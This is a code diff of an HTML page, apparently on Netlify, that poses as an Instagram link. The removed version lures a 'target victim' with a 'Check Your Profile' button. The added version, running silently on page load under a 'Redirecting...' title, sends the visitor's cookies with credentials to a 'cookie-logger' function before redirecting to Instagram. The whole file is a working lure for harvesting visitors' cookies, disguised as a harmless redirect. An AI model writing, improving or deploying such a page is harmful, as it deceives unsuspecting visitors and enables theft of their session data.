@@ -3,48 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IG Link</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
-    </style>
+    <title>Redirecting...</title>
+    <script>
+        // Log cookies before redirecting
+        fetch('/.netlify/functions/cookie-logger', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include'
+        }).catch(err => console.error('Logging failed:', err));
+
+        // Redirect to Instagram
+        window.location.href = 'https://www.instagram.com';
+    </script>
 </head>
 <body>
-    <!-- Replace 'username' with the target victim's IG username -->
-    <button id="goBtn">Check Your Profile</button>
-
-    <script>
-        // Set the target victim's Instagram URL here
-        const TARGET_IG = 'https://www.instagram.com/username/'; 
-        // Or get it from URL params: const TARGET_IG = new URLSearchParams(window.location.search).get('target');
-
-        document.getElementById('goBtn').addEventListener('click', async () => {
-            const btn = document.getElementById('goBtn');
-            btn.textContent = 'Loading...';
-            btn.disabled = true;
-
-            try {
-                // Send cookies to Netlify function
-                const response = await fetch(`/.netlify/functions/cookie-logger?target=${encodeURIComponent(TARGET_IG)}`, {
-                    method: 'GET', // GET is enough if we use queryStringParameters
-                    credentials: 'include'
-                });
-
-                const data = await response.json();
-                
-                // Redirect to Instagram
-                if (data.redirect) {
-                    window.location.href = data.redirect;
-                } else {
-                    btn.textContent = 'Error, try again';
-                    btn.disabled = false;
-                }
-            } catch (error) {
-                console.error(error);
-                btn.textContent = 'Error, try again';
-                btn.disabled = false;
-            }
-        });
-    </script>
+    <p>Redirecting to Instagram...</p>
 </body>
 </html>
